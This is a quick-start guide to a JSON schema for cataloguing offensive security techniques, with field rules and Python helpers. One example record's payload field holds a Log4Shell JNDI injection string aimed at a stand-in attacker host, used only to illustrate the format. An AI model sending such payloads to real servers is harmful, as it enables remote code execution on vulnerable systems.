# Hunter Skill Format - Quick Start Guide

## Quick Overview

The Hunter Skill standard format is a JSON schema for organizing cybersecurity knowledge and techniques.

### Current Status
- ✅ Schema defined: [SKILL_SCHEMA.json](./SKILL_SCHEMA.json)
- ✅ Documentation complete: [SKILL_STANDARD.md](./SKILL_STANDARD.md)
- ✅ Tools created: validation & migration scripts
- 🔄 Migration in progress

---

## 5-Minute Format Overview

### New Skill Structure
```json
{
  "version": "1.0.0",
  
  "metadata": {
    "id": "log4shell-cve-2021-44228",
    "schema_version": "1.0.0",
    "created_at": "2025-01-15T10:00:00Z",
    "updated_at": "2025-02-06T14:30:00Z",
    "status": "active"
  },
  
  "classification": {
    "category": "CVE Exploits",
    "subcategory": "Java Vulnerabilities",
    "tags": ["log4j", "rce", "critical"],
    "difficulty": "intermediate",
    "attack_type": ["exploitation"],
    "cves": ["CVE-2021-44228"]
  },
  
  "content": {
    "title": "Log4Shell RCE",
    "summary": "Apache Log4j JNDI injection...",
    "description": "Full description here...",
    "payloads": ["Line 1", "Line 2", "..."]
  },
  
  "context": {
    "source": "PayloadsAllTheThings",
    "references": [
      {
        "title": "POC Repository",
        "url": "https://github.com/example/poc",
        "type": "github"
      }
    ],
    "author": "Security Team",
    "license": "MIT"
  }
}
```

### Key Sections

#### 1. **Metadata** (Tracking)
- `id`: Unique identifier (semantic, not hash)
- `created_at`/`updated_at`: ISO 8601 timestamps
- `status`: active | deprecated | retired | draft
- `schema_version`: For migration tracking

#### 2. **Classification** (Organization & Discovery)
- `category`: Primary category (required)
- `subcategory`: Optional deeper level
- `tags`: Searchable keywords (optional)
- `difficulty`: beginner | intermediate | advanced
- `attack_type`: Type of attack/technique
- `cves`: Related CVE identifiers

#### 3. **Content** (The Actual Skill)
- `title`: Skill name
- `summary`: One-line description
- `description`: Full description
- `payloads`: Array of content lines

#### 4. **Context** (Source & References)
- `source`: Where it came from
- `references`: Links to original/related materials
- `author`: Who created it
- `license`: License information

---

## Common Categories

```
Account Takeover
API Key Leaks
CVE Exploits
DNS Rebinding
Encoding Transformations
File Inclusion
Insecure Deserialization
LDAP Injection
Methodology and Resources
Learning and Socials
[Custom categories]
```

## Common Difficulty Levels

- **Beginner**: Basic concepts, entry-level
- **Intermediate**: Some knowledge required, nuanced techniques
- **Advanced**: Expert-level, sophisticated exploitation

## Common Attack Types

- `reconnaissance` - Information gathering
- `exploitation` - Vulnerability exploitation
- `post-exploitation` - Post-compromise activities
- `evasion` - Evading security controls
- `social-engineering` - Human-focused attacks

---

## Working with Skills

### Reading a Skill (Python)
```python
import json

with open('skills/skill_file.json') as f:
    skill = json.load(f)

# Access fields
skill_id = skill['metadata']['id']
title = skill['content']['title']
category = skill['classification']['category']
tags = skill['classification'].get('tags', [])
difficulty = skill['classification'].get('difficulty')

# Reconstruct content from payloads
content = '\n'.join(skill['content']['payloads'])
```

### Creating a New Skill

```python
import json
from datetime import datetime

new_skill = {
    "version": "1.0.0",
    "metadata": {
        "id": "my-new-skill",
        "schema_version": "1.0.0",
        "created_at": datetime.utcnow().isoformat() + "Z",
        "updated_at": datetime.utcnow().isoformat() + "Z",
        "status": "active"
    },
    "classification": {
        "category": "Your Category",
        "tags": ["tag1", "tag2"],
        "difficulty": "intermediate"
    },
    "content": {
        "title": "Your Skill Title",
        "summary": "Brief summary",
        "description": "Full description",
        "payloads": ["Content line 1", "Content line 2"]
    },
    "context": {
        "source": "Your Source",
        "references": [
            {
                "title": "Reference Title",
                "url": "https://...",
                "type": "github"
            }
        ]
    }
}

# Save skill
with open('skills/new_skill.json', 'w') as f:
    json.dump(new_skill, f, indent=2)
```

### Validating a Skill

```bash
# Validate single file
python3 scripts/validate_skills.py skills/your_skill.json

# Validate directory
python3 scripts/validate_skills.py skills/

# Generate report
python3 scripts/validate_skills.py skills/ --report report.json
```

---

## Field Requirements

### Required Fields (Must Have)
- `metadata.id`
- `metadata.schema_version`
- `metadata.created_at`
- `metadata.updated_at`
- `metadata.status`
- `classification.category`
- `content.title`
- `content.payloads`
- `context.source`

### Recommended Fields
- `classification.tags`
- `classification.difficulty`
- `content.summary`
- `content.description`
- `context.author`

### Optional Fields
- `classification.subcategory`
- `classification.attack_type`
- `classification.cves`
- `context.references`
- `context.license`

---

## ID Naming Convention

IDs should be:
- **Semantic**: `log4shell-cve-2021-44228` (not `category-abc123`)
- **Lowercase**: Only lowercase letters, numbers, hyphens
- **Meaningful**: Describe the skill content
- **Unique**: No duplicates across all files

### ID Examples
- `mfa-bypass`
- `log4shell-cve-2021-44228`
- `sql-injection-blind`
- `windows-privilege-escalation`
- `docker-escape`

---

## Tag Guidelines

Use searchable keywords relevant to the skill.

### Good Tags
- `log4j` - Technology name
- `rce` - Attack result
- `authentication` - Category
- `java` - Programming language
- `web` - Domain

### Tag Rules
- Lowercase only
- Use hyphens for multi-word tags
- Max 20 tags per skill
- Avoid duplicates

---

## Reference Types

```
Type               Description
----               -----------
github             GitHub repository
blog               Blog post/article
documentation      Official docs
tool                Tool/script
pdf                 PDF document
video              Video content
academic           Research paper
other              Miscellaneous
```

---

## Timestamps

Always use ISO 8601 format with UTC timezone:

```
Format: YYYY-MM-DDTHH:MM:SSZ
Example: 2025-02-06T14:30:00Z
```

---

## Examples

### Example 1: CVE Exploit
```json
{
  "version": "1.0.0",
  "metadata": {
    "id": "log4shell-cve-2021-44228",
    "schema_version": "1.0.0",
    "created_at": "2025-01-15T10:00:00Z",
    "updated_at": "2025-02-06T14:30:00Z",
    "status": "active"
  },
  "classification": {
    "category": "CVE Exploits",
    "subcategory": "Java Vulnerabilities",
    "tags": ["log4j", "rce", "critical", "java"],
    "difficulty": "intermediate",
    "attack_type": ["exploitation"],
    "cves": ["CVE-2021-44228", "CVE-2021-45046"]
  },
  "content": {
    "title": "Log4Shell RCE",
    "summary": "Apache Log4j JNDI injection allowing remote code execution",
    "description": "Apache Log4j2 <=2.14.1 contains a critical vulnerability...",
    "payloads": ["${jndi:ldap://attacker.com/a}", "..."]
  },
  "context": {
    "source": "PayloadsAllTheThings",
    "references": [
      {
        "title": "Log4Shell POC",
        "url": "https://github.com/projectdiscovery/nuclei-templates",
        "type": "github"
      }
    ],
    "author": "Security Researchers",
    "license": "MIT"
  }
}
```

### Example 2: Learning Resource
```json
{
  "version": "1.0.0",
  "metadata": {
    "id": "python-security-resources",
    "schema_version": "1.0.0",
    "created_at": "2025-01-20T10:00:00Z",
    "updated_at": "2025-02-06T14:30:00Z",
    "status": "active"
  },
  "classification": {
    "category": "Learning and Socials",
    "tags": ["python", "programming", "resources", "learning"],
    "difficulty": "beginner"
  },
  "content": {
    "title": "Python Security Resources",
    "summary": "Curated Python resources for cybersecurity",
    "description": "A collection of Python libraries, tools, and resources...",
    "payloads": ["# Resources", "- Resource 1", "- Resource 2", "..."]
  },
  "context": {
    "source": "h4cker",
    "references": [
      {
        "title": "Awesome Python",
        "url": "https://github.com/vinta/awesome-python",
        "type": "github"
      }
    ]
  }
}
```

---

## Migration Status by Directory

| Directory | Files | Status |
|-----------|-------|--------|
| skills/ | 100+ | Ready for migration |
| skills/ | 50+ | Ready for migration |
| skills/ | 100+ | Ready for migration |

---

## Common Mistakes to Avoid

❌ **Wrong**: `"id": "account_takeover-abc123"`  
✅ **Right**: `"id": "mfa-bypass"`

❌ **Wrong**: `"created_at": "2025-02-06"` (missing time)  
✅ **Right**: `"created_at": "2025-02-06T14:30:00Z"`

❌ **Wrong**: `"category": "account takeover"` (lowercase)  
✅ **Right**: `"category": "Account Takeover"` (title case)

❌ **Wrong**: `"payloads": "string content"`  
✅ **Right**: `"payloads": ["line 1", "line 2"]`

❌ **Wrong**: `"references": ["https://link1", "https://link2"]`  
✅ **Right**: `"references": [{"title": "...", "url": "...", "type": "..."}]`

---

## Resources

- **Full Standard**: [SKILL_STANDARD.md](./SKILL_STANDARD.md)
- **JSON Schema**: [SKILL_SCHEMA.json](./SKILL_SCHEMA.json)
- **Migration Guide**: [MIGRATION_GUIDE.md](./MIGRATION_GUIDE.md)
- **Implementation Roadmap**: [IMPLEMENTATION_ROADMAP.md](./IMPLEMENTATION_ROADMAP.md)
- **Validation Tool**: `python3 scripts/validate_skills.py`
- **Migration Tool**: `python3 scripts/migrate_skills.py`

---

## Getting Help

### Validation Fails?
```bash
python3 scripts/validate_skills.py your_file.json
```

### Compare Formats?
```bash
# Look at example file
cat skills/account_takeover-8be4bd2d2663.json | jq '.'
```

### Debug Migration?
```bash
python3 scripts/migrate_skills.py your_file.json --dry-run
```

---

**Quick Start Version**: 1.0.0  
**Last Updated**: 2025-02-06
